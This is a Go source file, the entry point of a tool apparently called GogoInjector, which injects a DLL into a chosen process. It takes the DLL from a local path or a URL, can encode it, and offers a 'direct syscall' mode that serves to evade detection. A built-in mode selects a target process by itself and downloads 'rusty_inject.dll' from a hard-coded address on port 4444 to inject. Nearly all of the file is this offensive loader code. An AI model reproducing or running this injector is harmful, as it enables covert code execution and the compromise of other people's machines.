package main

import (
	"GogoInjector/encode"
	"GogoInjector/inject"
	"GogoInjector/utils"
	"flag"
	"fmt"
	"os"
	"runtime"
	"unsafe"
)

// var dll_path = "rusty_inject.dll"
func param_exec() {

	// Define the command-line options.
	pidPtr := flag.Int("pid", 0, "Process ID")
	localPtr := flag.String("local", "", "Local file path")
	urlPtr := flag.String("url", "", "URL of the file")
	encodeptr := flag.String("encode", "", "path of the dll to encode")
	directSyscallFlag := flag.Bool("s", false, "direct syscall flag (only for 64 bits process)")

	// Parse the command-line options.
	flag.Parse()

	// Dereference the pointers
	pid := *pidPtr
	local := *localPtr
	url := *urlPtr
	encode_path := *encodeptr
	dwPID := *(*uint32)(unsafe.Pointer(&pid))

	if encode_path != "" {
		encode.Encode(encode_path)
		os.Exit(1)
	}
	fmt.Printf("dwPID :%v\n", dwPID)
	if pid == 0 && encode_path == "" {
		// Check if PID is provided
		fmt.Println("PID is required.")
		os.Exit(1)
	}

	if local != "" && url != "" {
		// If both local and url are provided
		fmt.Println("Please provide either local file path or url, not both.")
		os.Exit(1)
	}

	if local == "" && url == "" {
		// If neither local nor url are provided
		fmt.Println("Please provide either local file path or url.")
		os.Exit(1)
	}

	if (local != "" || url != "") && pid != 0 && encode_path != "" {
		fmt.Println("Encode is set. Use it to encore the dll before loading it.")
		os.Exit(1)
	}

	// Check if direct syscall flag is set
	var call_mode string
	call_mode = "standard"
	if *directSyscallFlag {
		if runtime.GOARCH == "386" {
			fmt.Println("Direct syscall is set but runtime is x86, direct syscalls only works on 64 bits process.Exiting..")
			return
		}
		fmt.Println("Direct syscall is set.")
		call_mode = "direct"
	}

	fmt.Println("PID:", pid)

	if local != "" {
		// Handle the --local option.
		fmt.Println("Local path:", local)
		loading_type := "disk"

		// Run injection with local path
		err := inject.Mainfunc(dwPID, local, loading_type, call_mode)
		if err != nil {
			fmt.Println("Error :", err)
			return
		}
	} else if url != "" {
		// Handle the --url option.
		loading_type := "url"

		//Run injection with url
		err := inject.Mainfunc(dwPID, url, loading_type, call_mode)
		if err != nil {
			fmt.Println("Error :", err)
			return
		}
	}

}
func no_param_exec() {
	dwPID := uint32(inject.Findproc())
	fmt.Println("PID to inject :", dwPID)
	loading_type := "url"
	url := "http://192.168.1.1:4444/rusty_inject.dll"
	fmt.Println("URL to retrieve the dll :", url)
	//Run injection with url
	call_mode := "direct"
	err := inject.Mainfunc(dwPID, url, loading_type, call_mode)
	if err != nil {
		fmt.Println("Error :", err)
		return
	}
}
func main() {
	//no_param_exec() // uncomment if to use embeded arguments
	utils.Retrieve_OS_build()
	param_exec() // comment if previous line is used

}
